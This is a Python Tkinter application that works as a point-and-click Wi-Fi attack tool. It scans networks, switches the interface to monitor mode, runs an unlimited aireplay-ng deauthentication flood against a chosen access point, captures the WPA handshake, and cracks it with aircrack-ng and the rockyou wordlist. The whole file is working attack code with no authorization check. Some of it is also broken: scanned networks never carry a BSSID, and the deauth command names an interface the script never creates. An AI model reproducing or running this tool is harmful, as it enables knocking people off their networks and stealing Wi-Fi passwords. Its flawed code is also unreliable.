import tkinter as tk
from tkinter import scrolledtext, messagebox
import threading
import tempfile
import subprocess
import os
import signal
import time
import queue
import glob
import re


# =========================
# Config
# =========================
APP_BG           = "#000000"
CARD_BG          = "#0d0d0d"
CARD_BG_SELECTED = "#1a1a1a"
TEXT             = "#d4d4d4"
MUTED            = "#4a4a4a"
ACCENT           = "#00ff41"
SUCCESS          = "#00cc44"
DANGER           = "#cc2200"
BORDER           = "#1f1f1f"

WIFI_IFACE = "wlan1"
AUTO_RESCAN_MS = 15000
WIFI_ESSID = ""
WORDLIST_PATH = "/usr/share/wordlists/rockyou.txt"

# ==================== MONITOR SCRIPT (as variable) ====================
MONITOR_SCRIPT = '''#!/bin/bash
set -uo pipefail
cleanup() {
    sudo systemctl start NetworkManager wpa_supplicant iwd 2>/dev/null || true
}
trap cleanup EXIT

echo "=== Aircrack-ng Monitor Mode ==="
echo "Interface: $WIFI_IFACE"
echo "ESSID: ${ESSID:-<not set>}"

mkdir -p captures
CAPTURE_DIR="captures/capture_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$CAPTURE_DIR"
echo "Captures will be saved in: $CAPTURE_DIR/"

echo "Stopping interfering services..."
sudo systemctl stop wpa_supplicant 2>/dev/null || true
sudo systemctl stop NetworkManager 2>/dev/null || true
sudo systemctl stop iwd 2>/dev/null || true
sleep 1

echo "Putting $WIFI_IFACE into monitor mode..."
sudo ip link set "$WIFI_IFACE" down      || { echo "ERROR: failed to bring $WIFI_IFACE down"; exit 1; }
sudo iw dev "$WIFI_IFACE" set type monitor || { echo "ERROR: failed to set monitor mode"; exit 1; }
sudo ip link set "$WIFI_IFACE" up        || { echo "ERROR: failed to bring $WIFI_IFACE up"; exit 1; }

MON_IFACE="$WIFI_IFACE"
if iwconfig 2>/dev/null | grep -q "$WIFI_IFACE.*Mode:Monitor"; then
    echo "Monitor mode confirmed on $MON_IFACE"
else
    echo "Warning: could not confirm monitor mode — proceeding anyway."
fi

echo "Starting airodump-ng on $MON_IFACE..."
echo "→ A WPA handshake will be shown in the top right when captured."
echo "Press the 'Stop Monitoring' button in the GUI to stop."

cd "$CAPTURE_DIR" || exit 1
exec sudo airodump-ng -w capture --essid "$ESSID" "$MON_IFACE"
'''

# ==================== NEW MONITORING WINDOW ====================
class MonitorWindow:
    def __init__(self, parent, net):
        self.parent = parent
        self.net = net
        self.wifi_iface = WIFI_IFACE
        self.process = None
        self.deauth_process = None
        self.crack_process = None
        self.running = True
        self.log_queue = queue.Queue()
        self.essid = net['ssid']
        self.capture_dir = None
        self.launch_cwd = os.getcwd()

        self.window = tk.Toplevel(parent)
        self.window.title(f"Monitoring: {net['ssid']}")
        self.window.geometry("370x210")
        self.window.minsize(370, 210)
        self.window.maxsize(370, 210)
        self.window.configure(bg="#000000")

        # Grid layout so the text box expands but buttons stay visible
        self.window.grid_rowconfigure(1, weight=1)
        self.window.grid_columnconfigure(0, weight=1)

        # Header
        self.header_label = tk.Label(
            self.window,
            text=f"Monitoring: {self._short_ssid(net['ssid'])}",
            font=("Arial", 8, "bold"),
            bg="#000000",
            fg="#d4d4d4",
            anchor="w"
        )
        self.header_label.grid(row=0, column=0, sticky="ew", padx=4, pady=(3, 1))

        # Output area
        self.output_text = scrolledtext.ScrolledText(
            self.window,
            font=("Consolas", 7),
            bg="#0d0d0d",
            fg="#00ff00",
            insertbackground="white",
            wrap="word",
            relief="flat",
            borderwidth=1
        )
        self.output_text.grid(row=1, column=0, sticky="nsew", padx=4, pady=2)

        # Bottom controls
        self.btn_frame = tk.Frame(self.window, bg="#000000")
        self.btn_frame.grid(row=2, column=0, sticky="ew", padx=4, pady=(1, 4))
        self.btn_frame.grid_columnconfigure(0, weight=1)
        self.btn_frame.grid_columnconfigure(1, weight=1)

        self.deauth_btn = tk.Button(
            self.btn_frame,
            text="Deauth",
            command=self.send_deauth,
            bg="#cc2200",
            fg="#d4d4d4",
            font=("Arial", 8, "bold"),
            width=12,
            height=1
        )
        self.deauth_btn.grid(row=0, column=0, sticky="w", padx=(0, 3))

        self.stop_btn = tk.Button(
            self.btn_frame,
            text="Stop",
            command=self.stop_monitoring,
            bg="#0033aa",
            fg="#d4d4d4",
            font=("Arial", 8, "bold"),
            width=12,
            height=1
        )
        self.stop_btn.grid(row=0, column=1, sticky="e", padx=(3, 0))

        self.crack_btn = tk.Button(
            self.btn_frame,
            text="Crack (waiting for handshake...)",
            command=self.start_crack,
            bg="#111111",
            fg="#4a4a4a",
            font=("Arial", 7, "bold"),
            height=1,
            state="disabled"
        )
        self.crack_btn.grid(row=1, column=0, columnspan=2, sticky="ew", pady=(3, 0))

        self.window.protocol("WM_DELETE_WINDOW", self.stop_monitoring)

        # Start UI queue polling
        self.window.after(100, self.process_log_queue)

        # Start worker thread
        threading.Thread(target=self.start_monitoring, daemon=True).start()

        # Begin polling for a captured handshake (delayed to let cap file appear)
        self.window.after(8000, self._poll_for_handshake)

    def _short_ssid(self, ssid, max_len=28):
        ssid = str(ssid)
        return ssid if len(ssid) <= max_len else ssid[:max_len - 3] + "..."

    def append_output(self, text):
        self.log_queue.put(text)

    def process_log_queue(self):
        try:
            while not self.log_queue.empty():
                text = self.log_queue.get_nowait()
                self.output_text.insert(tk.END, text)
                self.output_text.see(tk.END)
        except Exception:
            pass

        if self.running and self.window.winfo_exists():
            self.window.after(100, self.process_log_queue)

    def start_monitoring(self):
        try:
            with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as f:
                script_content = (MONITOR_SCRIPT
                    .replace("${WIFI_IFACE}", self.wifi_iface)
                    .replace("$WIFI_IFACE", self.wifi_iface)
                    .replace("${ESSID:-<not set>}", self.essid)
                    .replace("$ESSID", self.essid))
                f.write(script_content)
                script_path = f.name

            os.chmod(script_path, 0o755)

            self.process = subprocess.Popen(
                ["bash", script_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                preexec_fn=os.setsid
            )

            self.append_output(f"Started monitoring {self.net['ssid']}\n")
            self.append_output("Waiting for output...\n\n")

            cap_prefix = "Captures will be saved in: "
            for line in iter(self.process.stdout.readline, ''):
                if not self.running:
                    break
                if line.startswith(cap_prefix):
                    rel = line[len(cap_prefix):].strip().rstrip("/")
                    self.capture_dir = os.path.join(self.launch_cwd, rel)
                self.append_output(line)

            if self.process:
                self.process.wait()

        except Exception as e:
            self.append_output(f"\nError: {e}\n")

    def send_deauth(self):
        if not self.process or not self.running:
            messagebox.showwarning("Not running", "Monitoring is not active.")
            return

        bssid = self.net.get("bssid", "")
        if not bssid:
            messagebox.showerror("Error", "BSSID not available for this network.")
            return

        try:
            if self.deauth_process and self.deauth_process.poll() is None:
                self.deauth_process.terminate()

            cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", bssid, f"{self.wifi_iface}mon"]
            self.deauth_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            self.append_output(f"\n>>> Started deauth on {bssid}\n")
            self.append_output("Watching for reconnect activity...\n\n")

            threading.Thread(target=self._monitor_deauth, daemon=True).start()

        except Exception as e:
            self.append_output(f"\nDeauth error: {e}\n")

    def _monitor_deauth(self):
        try:
            if self.deauth_process and self.deauth_process.stdout:
                for line in iter(self.deauth_process.stdout.readline, ''):
                    if not self.running:
                        break
                    # Usually too noisy for small screen; enable if needed:
                    # self.append_output(line)
                    pass
        except Exception:
            pass

    def _poll_for_handshake(self):
        if not self.running:
            return
        if self.capture_dir:
            cap_files = glob.glob(os.path.join(self.capture_dir, "*.cap"))
            if cap_files:
                bssid = self.net.get("bssid", "")
                cmd = ["aircrack-ng"]
                if bssid:
                    cmd += ["-b", bssid]
                cmd.append(cap_files[0])
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                    if re.search(r"\([1-9]\d* handshake", result.stdout):
                        self.window.after(0, self._enable_crack_btn)
                        return
                except Exception:
                    pass
        self.window.after(5000, self._poll_for_handshake)

    def _enable_crack_btn(self):
        self.append_output("\n>>> WPA handshake captured! Press 'Crack' to start decryption.\n")
        self.crack_btn.config(
            text="Crack handshake",
            state="normal",
            bg="#cc8800",
            fg="#000000"
        )

    def start_crack(self):
        if not self.capture_dir:
            self.append_output("\nCapture directory not known yet.\n")
            return
        bssid = self.net.get("bssid", "")
        cap_files = glob.glob(os.path.join(self.capture_dir, "*.cap"))
        if not cap_files:
            self.append_output("\nNo .cap files found in capture directory.\n")
            return
        cmd = ["sudo", "aircrack-ng", "-w", WORDLIST_PATH]
        if bssid:
            cmd += ["-b", bssid]
        cmd.append(cap_files[0])
        self.append_output(f"\n>>> Cracking {os.path.basename(cap_files[0])}\n")
        self.append_output(f"    Wordlist: {WORDLIST_PATH}\n\n")
        self.crack_btn.config(state="disabled", text="Cracking...", bg="#334155", fg="#64748b")
        try:
            self.crack_process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
            )
            threading.Thread(target=self._stream_crack, daemon=True).start()
        except Exception as e:
            self.append_output(f"\nCrack error: {e}\n")

    def _stream_crack(self):
        ansi = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")
        try:
            for line in iter(self.crack_process.stdout.readline, ""):
                if not self.running:
                    break
                self.append_output(ansi.sub("", line))
            self.crack_process.wait()
            if "KEY FOUND" in (self.crack_process.stdout.read() or ""):
                self.append_output("\n>>> KEY FOUND! See output above.\n")
            else:
                self.append_output("\n>>> Finished. Key not found in wordlist.\n")
        except Exception:
            pass

    def stop_monitoring(self):
        self.running = False

        if self.deauth_process and self.deauth_process.poll() is None:
            try:
                self.deauth_process.terminate()
                self.deauth_process.wait(timeout=2)
            except Exception:
                pass

        if self.crack_process and self.crack_process.poll() is None:
            try:
                self.crack_process.terminate()
                self.crack_process.wait(timeout=2)
            except Exception:
                pass

        if self.process and self.process.poll() is None:
            try:
                os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
                time.sleep(1)
                if self.process.poll() is None:
                    os.killpg(os.getpgid(self.process.pid), signal.SIGKILL)
            except Exception:
                pass

        try:
            mon_iface = f"{self.wifi_iface}mon"

            print(f"Stopping monitor mode on {mon_iface}...")

            # Use manual cleanup instead of airmon-ng stop (much safer with hostapd)
            subprocess.run(
                ["sudo", "ip", "link", "set", self.wifi_iface, "down"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=5
            )

            subprocess.run(
                ["sudo", "iw", "dev", self.wifi_iface, "set", "type", "managed"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=5
            )

            subprocess.run(
                ["sudo", "ip", "link", "set", self.wifi_iface, "up"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=5
            )

            # Also try to remove the monitor interface if it still exists
            subprocess.run(
                ["sudo", "ip", "link", "delete", mon_iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=3
            )

            print(f"Successfully restored {self.wifi_iface} to managed mode.")

        except subprocess.TimeoutExpired:
            print(f"Warning: Timeout while stopping monitor mode on {self.wifi_iface}")
        except Exception as e:
            print(f"Warning: Failed to stop monitor mode cleanly: {e}")
            # Fallback: try original airmon-ng stop (less safe)
            try:
                subprocess.run(
                    ["sudo", "airmon-ng", "stop", mon_iface],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=5
                )
            except Exception:
                pass

        try:
            subprocess.run(
                ["sudo", "systemctl", "restart", "NetworkManager"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=5
            )
        except Exception:
            pass

        try:
            self.window.destroy()
        except Exception:
            pass

        try:
            messagebox.showinfo(
                "Stopped",
                f"Monitoring for {self.net['ssid']} has been stopped."
            )
        except Exception:
            pass

class WifiUI:
    def __init__(self, root: tk.Tk):
        self.root = root
        self.root.title("WiFi Monitor")
        self.root.configure(bg=APP_BG)
        self.root.attributes("-fullscreen", True)

        self.networks = []
        self.selected_index = 0
        self.is_scanning = False
        self.rescan_job = None

        self.status_var = tk.StringVar(value="Scanning...")
        self.header_var = tk.StringVar(value="Wi-Fi Networks")

        self.build_ui()
        self.root.after(300, self.scan_wifi_async)

    def build_ui(self):
        self.root.grid_rowconfigure(1, weight=1)
        self.root.grid_columnconfigure(0, weight=1)

        # Top bar - smaller
        top = tk.Frame(self.root, bg=APP_BG)
        top.grid(row=0, column=0, sticky="ew", padx=8, pady=6)
        top.grid_columnconfigure(0, weight=1)

        tk.Label(top, textvariable=self.header_var, font=("Arial", 14, "bold"), bg=APP_BG, fg=TEXT, anchor="w").grid(row=0, column=0, sticky="w")

        tk.Button(top, text="✕", font=("Arial", 14, "bold"), bg=DANGER, fg="white", bd=0, relief="flat",
                  padx=10, pady=4, command=self.close_app).grid(row=0, column=1, sticky="e")

        # Main area
        content = tk.Frame(self.root, bg=APP_BG)
        content.grid(row=1, column=0, sticky="nsew", padx=8, pady=4)
        content.grid_rowconfigure(0, weight=1)
        content.grid_columnconfigure(0, weight=1)

        # List (no scrollbar)
        self.canvas = tk.Canvas(content, bg=APP_BG, highlightthickness=0, bd=0)
        self.canvas.grid(row=0, column=0, sticky="nsew")

        self.list_frame = tk.Frame(self.canvas, bg=APP_BG)
        self.canvas.create_window((0, 0), window=self.list_frame, anchor="nw")

        self.list_frame.bind("<Configure>", lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")))
        self.canvas.bind("<Configure>", lambda e: self.canvas.itemconfigure(self.canvas.find_withtag("all")[0], width=e.width))

        # Smaller controls on right (fits 3.5")
        controls = tk.Frame(content, bg=APP_BG, width=90)
        controls.grid(row=0, column=1, sticky="ns", padx=(6,0))
        controls.grid_propagate(False)

        tk.Button(controls, text="▲", font=("Arial", 18, "bold"), bg=ACCENT, fg="#082f49", bd=0, height=2,
                  command=self.move_up).pack(fill="x", pady=(0,4))
        tk.Button(controls, text="▼", font=("Arial", 18, "bold"), bg=ACCENT, fg="#082f49", bd=0, height=2,
                  command=self.move_down).pack(fill="x", pady=(0,6))
        tk.Button(controls, text="SELECT", font=("Arial", 12, "bold"), bg=SUCCESS, fg="white", bd=0, height=2,
                  command=self.select_current).pack(fill="x")

        # Status
        tk.Label(self.root, textvariable=self.status_var, font=("Arial", 10), bg=APP_BG, fg=MUTED,
                 anchor="w", wraplength=300).grid(row=2, column=0, sticky="ew", padx=8, pady=4)

        self.show_empty_state("Scanning...")

    def close_app(self):
        if self.rescan_job: self.root.after_cancel(self.rescan_job)
        self.root.destroy()

    def set_status(self, text):
        self.status_var.set(text)

    def run_command(self, cmd):
        return subprocess.run(cmd, capture_output=True, text=True, check=False)

    def clear_network_list(self):
        for w in self.list_frame.winfo_children(): w.destroy()

    def show_empty_state(self, text):
        self.clear_network_list()
        tk.Label(self.list_frame, text=text, font=("Arial", 12), bg=CARD_BG, fg=MUTED, pady=30).pack(fill="x", padx=4, pady=8)

    def parse_nmcli_output(self, output):
        rows = []
        seen = set()
        for line in output.splitlines():
            if not line.strip(): continue
            parts = line.strip().split(":", 2)
            ssid = (parts[0] or "<hidden>").strip()
            signal = parts[1].strip() if len(parts)>1 else "0"
            security = (parts[2] or "Open").strip() if len(parts)>2 else "Open"
            key = (ssid, security)
            if key not in seen:
                seen.add(key)
                rows.append({"ssid": ssid, "signal": signal, "security": security})
        rows.sort(key=lambda r: int(r["signal"]) if r["signal"].isdigit() else -1, reverse=True)
        return rows

    def ensure_selection_valid(self):
        if self.networks:
            self.selected_index = max(0, min(self.selected_index, len(self.networks)-1))

    def scroll_selected_into_view(self):
        self.root.update_idletasks()
        cards = self.list_frame.winfo_children()
        if not cards or self.selected_index >= len(cards): return
        sel = cards[self.selected_index]
        y = sel.winfo_y()
        total = max(self.list_frame.winfo_height(), 1)
        self.canvas.yview_moveto(max(0, (y - 60) / total))

    def move_up(self):
        if self.networks:
            self.selected_index -= 1
            self.ensure_selection_valid()
            self.render_networks()
            self.scroll_selected_into_view()

    def move_down(self):
        if self.networks:
            self.selected_index += 1
            self.ensure_selection_valid()
            self.render_networks()
            self.scroll_selected_into_view()

    def select_current(self):
        if self.networks:
            self.on_network_selected(self.networks[self.selected_index])

    def scan_wifi_async(self):
        if self.is_scanning: return
        threading.Thread(target=self.scan_wifi, daemon=True).start()

    def scan_wifi(self):
        self.is_scanning = True
        self.root.after(0, lambda: self.set_status("Scanning..."))

        self.run_command(["nmcli", "device", "wifi", "rescan", "ifname", WIFI_IFACE])
        result = self.run_command(["nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY", "device", "wifi", "list", "ifname", WIFI_IFACE])

        if result.returncode != 0:
            self.root.after(0, lambda: self._scan_failed())
            return

        self.networks = self.parse_nmcli_output(result.stdout)

        def update():
            self.is_scanning = False
            self.ensure_selection_valid()
            if not self.networks:
                self.header_var.set("Wi-Fi Networks")
                self.show_empty_state("No networks")
                self.set_status("No networks found")
            else:
                self.header_var.set(f"Networks ({len(self.networks)})")
                self.render_networks()
                self.set_status(f"Selected: {self.networks[self.selected_index]['ssid']}")
            self.schedule_next_scan()

        self.root.after(0, update)

    def _scan_failed(self):
        self.is_scanning = False
        self.show_empty_state("Scan failed")
        self.set_status("Scan failed")
        self.schedule_next_scan()

    def schedule_next_scan(self):
        if self.rescan_job: self.root.after_cancel(self.rescan_job)
        self.rescan_job = self.root.after(AUTO_RESCAN_MS, self.scan_wifi_async)

    def render_networks(self):
        self.clear_network_list()
        for i, net in enumerate(self.networks):
            self.add_network_card(i, net)

    def add_network_card(self, idx, net):
        is_sel = idx == self.selected_index
        bg = CARD_BG_SELECTED if is_sel else CARD_BG

        card = tk.Frame(self.list_frame, bg=bg, highlightthickness=2 if is_sel else 1,
                        highlightbackground=ACCENT if is_sel else BORDER)
        card.pack(fill="x", padx=4, pady=5)

        row = tk.Frame(card, bg=bg)
        row.pack(fill="x", padx=10, pady=10)

        tk.Label(row, text=net["ssid"], font=("Arial", 13, "bold"), bg=bg, fg=TEXT, anchor="w").pack(side="left", fill="x", expand=True)
        tk.Label(row, text=f"{net['signal']}%", font=("Arial", 12, "bold"), bg=bg, fg=SUCCESS).pack(side="right")

    def on_network_selected(self, net):
        self.set_status(f"Starting monitor for {net['ssid']}...")
        try:
            MonitorWindow(self.root, net)
        except Exception as e:
            messagebox.showerror("Error", str(e))


if __name__ == "__main__":
    root = tk.Tk()
    app = WifiUI(root)
    root.mainloop()